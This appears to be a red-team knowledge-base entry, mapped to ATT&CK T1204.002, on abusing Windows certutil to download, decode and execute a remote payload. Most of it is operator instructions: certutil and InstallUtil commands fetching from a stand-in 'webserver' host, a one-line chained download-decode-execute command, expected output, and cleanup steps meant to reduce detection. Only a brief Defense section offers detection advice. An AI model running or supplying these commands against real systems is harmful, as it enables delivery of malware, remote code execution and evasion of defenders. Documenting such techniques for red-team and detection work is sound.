---
type: procedure
verified: true
submitted: false
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/User Execution|T1204 - User Execution]]'
sub_techniques:
  - '[[sub-techniques/Malicious File|T1204.002 - Malicious File]]'
tags:
  - '[[tags/Certutil]]'
  - '[[tags/Windows - Download and execute methods]]'
commands:
  - '[[commands/certutil-download-base64-payload]]'
  - '[[commands/certutil-decode-base64-to-dll]]'
  - '[[commands/installutil-execute-dll-payload]]'
  - '[[codes/Certutil-Download-Decode-and-Execute-EXE]]'
platforms:
  - Windows
tools: []
validated: true
---

# Certutil-Download-and-Execute

## Summary

This procedure uses the built-in Windows Certutil utility to download a base64-encoded payload from a remote server, decode it to either a DLL or EXE file, and execute it on the target system. It leverages Certutil's URL cache and decode functions to bypass restrictions on direct downloads and executions, enabling attackers to deliver and run malicious code without additional tools.

## Description

Certutil.exe is a legitimate Windows command-line tool for managing certificates, but it can be abused for downloading files via its -urlcache option and decoding base64 content with -decode. In this technique, a base64-encoded payload is hosted on an attacker-controlled web server. The procedure downloads the encoded file, decodes it to a usable format (DLL or EXE), and executes it using either InstallUtil for DLLs (to simulate service installation) or direct execution for EXEs. This method is effective in environments with restricted internet access or where PowerShell or other scripting is monitored, as it relies solely on native Windows binaries. It is commonly used during initial access or lateral movement to deploy backdoors or implants. Success depends on the target having outbound HTTP access and .NET Framework installed for DLL execution.

## Requirements

1. Command prompt access on a Windows system (user-level privileges suffice for execution).
2. Outbound internet access to the attacker's web server hosting the base64-encoded payload.
3. .NET Framework 4.0 or later installed (required for InstallUtil in the DLL variant).
4. The payload must be properly base64-encoded and hosted as a .b64 file on an HTTP server.

## Defense

- Monitor Certutil.exe usage, particularly the -urlcache and -decode switches, via process auditing and command-line logging (e.g., Sysmon Event ID 1 with Image: certutil.exe).
- Implement application whitelisting to restrict Certutil execution or block non-standard parameters using tools like AppLocker or WDAC.
- Enable network proxies or firewalls to inspect and block suspicious outbound HTTP requests to unknown domains.
- Scan for unexpected files (e.g., payload.dll or payload.exe) in temporary directories and monitor InstallUtil.exe executions.

## Objectives

1. Download a base64-encoded payload from a remote server without triggering download restrictions.
2. Decode the payload to an executable format (DLL or EXE) on the target system.
3. Execute the payload to establish persistence, execute code, or achieve further objectives like reverse shell access.
4. Maintain operational security by using native tools to evade detection.

## Instructions

This procedure outlines two variants: one for decoding to a DLL and executing via InstallUtil (useful for persistence as a service), and one for decoding to an EXE and direct execution (simpler but more detectable). Choose based on the payload type and desired persistence.

### Step 1: Download the Base64-Encoded Payload

**Context**: Retrieve the encoded payload from the attacker's web server using Certutil's URL cache feature, which mimics legitimate certificate downloads. This step saves the file as payload.b64 in the current directory.

**Command** ([[commands/certutil-download-base64-payload]]):
```cmd
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
```

> This command forces a download (-f) and splits large files (-split) for reliability. Run it from an elevated or standard command prompt. Verify the file exists post-execution to confirm success.

**Expected Output**: Certutil reports the download completion, e.g., "Download done." The file payload.b64 appears in the directory (size matching the encoded payload).

### Step 2A: Decode to DLL and Execute via InstallUtil (DLL Variant)

**Context**: For DLL payloads, decode the base64 file to payload.dll, then use InstallUtil (a .NET utility) to execute it by simulating uninstallation (/u flag), which triggers the DLL's entry point without full installation. This is stealthier for persistence.

**Command** ([[commands/certutil-decode-base64-to-dll]]):
```cmd
certutil -decode payload.b64 payload.dll
```

> Decodes the base64 content to a binary DLL file. Ensure the input file is valid base64 to avoid errors.

**Expected Output**: "Decode succeeded." The payload.dll file is created and verifiable via dir or file size check.

**Command** ([[commands/installutil-execute-dll-payload]]):
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u payload.dll
```

> Executes the DLL silently (/LogToConsole=false) using the uninstall flag to run the payload code. Requires .NET Framework path; adjust for 32-bit if needed.

**Expected Output**: InstallUtil outputs minimal logs (suppressed), but success is indicated by the payload's behavior (e.g., reverse shell connection or process spawn). Check for new services or network activity.

### Step 2B: Decode to EXE and Direct Execution (EXE Variant)

**Context**: For EXE payloads, decode directly to payload.exe and run it. This is faster but leaves a more obvious executable file.

**Command** ([[codes/Certutil-Download-Decode-and-Execute-EXE]]):
```cmd
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

> This chains all steps: download, decode, and execute in one line using & separators. Ideal for scripted or quick ops; the payload runs immediately after decoding.

**Expected Output**: Sequential Certutil success messages ("Download done." and "Decode succeeded."), followed by the EXE's output or behavior (e.g., console output from the payload). The temporary payload.b64 can be deleted post-execution for cleanup.

### Step 3: Verification and Cleanup

**Context**: Confirm payload execution and remove artifacts to reduce detection risk.

**Instructions**: Monitor for payload indicators (e.g., new processes via tasklist, network connections via netstat). Delete temporary files: del payload.b64 payload.dll (or .exe). If using DLL variant, check services via sc query for unexpected entries.

**Expected Output**: Payload achieves objective (e.g., shell access); no residual files or logs.
